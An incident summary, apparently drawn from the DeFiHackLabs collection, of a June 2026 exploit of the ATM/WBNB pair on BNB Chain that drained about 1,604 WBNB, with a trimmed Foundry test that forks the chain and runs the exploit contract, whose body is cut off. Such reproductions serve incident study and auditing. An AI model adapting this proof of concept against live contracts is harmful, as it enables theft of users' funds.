# [?] ATM - LP Token Burn

## Summary
Severity: Unknown
Chain: BNB Chain
Component: ATM_LP_Burn
Published: 2026-06-22
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/ATM_LP_Burn_exp.sol
Type: defi-exploit-poc

## Details
Lost: 1,603.99 WBNB

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 105_692_847;
        vm.createSelectFork("bsc", forkBlock);
        fundingToken = WBNB_TOKEN;
        attacker = FINAL_PROFIT_RECEIVER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(LP_OWNER, "Victim / mistaken LP owner");
        vm.label(ATM_WBNB_PAIR, "ATM/WBNB Pancake pair");
        vm.label(WBNB_TOKEN, "WBNB");
        vm.label(ATM_TOKEN, "ATM");
        vm.label(FINAL_PROFIT_RECEIVER, "Final WBNB receiver");
        vm.label(BUILDER_PAYMENT_RECEIVER, "Builder payment receiver");
        vm.label(DUST_WBNB_RECEIVER, "Dust WBNB receiver");
    }

    function testExploit() public balanceLog {
        AtmLpBurnExploit exploit = new AtmLpBurnExploit(FINAL_PROFIT_RECEIVER);

        uint256 receiverBefore = IERC20(WBNB_TOKEN).balanceOf(FINAL_PROFIT_RECEIVER);
        uint256 pairHeldLp = IERC20(ATM_WBNB_PAIR).balanceOf(ATM_WBNB_PAIR);
        assertGt(pairHeldLp, 400_000 ether, "pair should hold mistaken LP");
        assertEq(IERC20(ATM_WBNB_PAIR).balanceOf(LP_OWNER), 0, "LP owner already sent LP");

        vm.prank(ATTACKER);
        exploit.attack();

        uint256 profit = IERC20(WBNB_TOKEN).balanceOf(FINAL_PROFIT_RECEIVER) - receiverBefore;
        assertGt(profit, 32 ether, "final receiver WBNB profit");
        assertEq(IERC20(ATM_WBNB_PAIR).balanceOf(ATM_WBNB_PAIR), 0, "pair LP burned");
    }
}

contract AtmLpBurnExploit {
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/ATM_LP_Burn_exp.sol_
